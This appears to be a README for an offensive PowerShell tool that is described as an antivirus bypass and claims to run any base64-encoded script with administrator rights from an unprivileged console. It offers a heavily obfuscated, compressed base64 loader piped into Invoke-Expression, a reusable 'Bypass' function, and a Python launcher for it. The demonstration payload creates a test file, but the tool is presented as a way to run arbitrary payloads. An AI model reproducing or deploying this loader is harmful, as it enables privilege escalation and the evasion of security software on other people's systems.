## Description

This will allow you to run any base64 encoded script from a standard Powershell console regardless if Admin Privledges are required. It is for AV bypass.

## The Function

### [UAC-Bypass] 

This function has 2 parts. 

You have the ```$code``` variable you can store any base64 encoded script into. 

You can use the B64 function to encode your own scripts.

```PowerShell
$code = "TgBlAHcALQBJAHQAZQBtACAAQwA6AFwASQB0AC0AVwBvAHIAawBlAGQALgB0AHgAdAA="
```
Next you have a highly obfuscated block of code that will run any Base64 encoded script stored in the ```$code``` variable with Admin rights. 

Using the code above as an example running both of these in a standard non Admin Powershell console will create a file called ```It-Worked.txt``` 

in your C: directory just to show you it works.

```PowerShell
(nEw-OBJECt  Io.CoMpreSsion.DEflateSTrEaM( [SyStem.io.memoRYSTReaM][convErT]::fromBaSE64STriNg( 'hY49C8IwGIT/ykvoGjs4FheLqIgfUHTKEpprK+SLJFL99zYFwUmXm+6ee4rzcbti3o0IcYDWCzxBfKSB+Mldctg98c0TLa1fXsZIHLalonUKxKqAnqRSxHaH+ioa16VRBohaT01EsXCmF03mirOHFa0zRlrFqFRUTM9Udv8QJvKIlO62j6J+hBvCvGYZzfK+c2o68AhZvWqSDIk3GvDEIy1nvIJGwk9J9lH53f22mSdv') ,[SysTEM.io.COMpResSion.coMPRESSIONMoDE]::DeCompress ) | ForeacH{nEw-OBJECt Io.StReaMrEaDer( $_,[SySTEM.teXT.enCOdING]::aSciI )}).rEaDTOEnd( ) | InVoKE-expREssION
```

I have turned this bypass into a function as well. 

Using the following syntax you can run any Base64 encoded script as an Admin:

```PowerShell
Bypass TgBlAHcALQBJAHQAZQBtACAAQwA6AFwASQB0AC0AVwBvAHIAawBlAGQALgB0AHgAdAA=
```

```PowerShell
function Bypass {
[CmdletBinding()]
param (
[Parameter (Position=0, Mandatory = $True)]
[string]$code )

(nEw-OBJECt  Io.CoMpreSsion.DEflateSTrEaM( [SyStem.io.memoRYSTReaM][convErT]::fromBaSE64STriNg( 'hY49C8IwGIT/ykvoGjs4FheLqIgfUHTKEpprK+SLJFL99zYFwUmXm+6ee4rzcbti3o0IcYDWCzxBfKSB+Mldctg98c0TLa1fXsZIHLalonUKxKqAnqRSxHaH+ioa16VRBohaT01EsXCmF03mirOHFa0zRlrFqFRUTM9Udv8QJvKIlO62j6J+hBvCvGYZzfK+c2o68AhZvWqSDIk3GvDEIy1nvIJGwk9J9lH53f22mSdv') ,[SysTEM.io.COMpResSion.coMPRESSIONMoDE]::DeCompress ) | ForeacH{nEw-OBJECt Io.StReaMrEaDer( $_,[SySTEM.teXT.enCOdING]::aSciI )}).rEaDTOEnd( ) | InVoKE-expREssION
}
``` 
 
Python version: 

```Python
import base64
import subprocess
plain_command = "New-Item C:\it-worked.txt"
code = bytearray(plain_command, 'utf-16-le');code = base64.b64encode(code).decode()   
setVar = "Set-Variable -Name 'code' -Value "+f'"{code}";'
final_command = r"(nEw-OBJECt  Io.CoMpreSsion.DEflateSTrEaM( [SyStem.io.memoRYSTReaM][convErT]::fromBaSE64STriNg( 'hY49C8IwGIT/ykvoGjs4FheLqIgfUHTKEpprK+SLJFL99zYFwUmXm+6ee4rzcbti3o0IcYDWCzxBfKSB+Mldctg98c0TLa1fXsZIHLalonUKxKqAnqRSxHaH+ioa16VRBohaT01EsXCmF03mirOHFa0zRlrFqFRUTM9Udv8QJvKIlO62j6J+hBvCvGYZzfK+c2o68AhZvWqSDIk3GvDEIy1nvIJGwk9J9lH53f22mSdv') ,[SysTEM.io.COMpResSion.coMPRESSIONMoDE]::DeCompress ) | ForeacH{nEw-OBJECt Io.StReaMrEaDer( $_,[SySTEM.teXT.enCOdING]::aSciI )}).rEaDTOEnd( ) | InVoKE-expREssION"
subprocess.run(["powershell",setVar,final_command])
```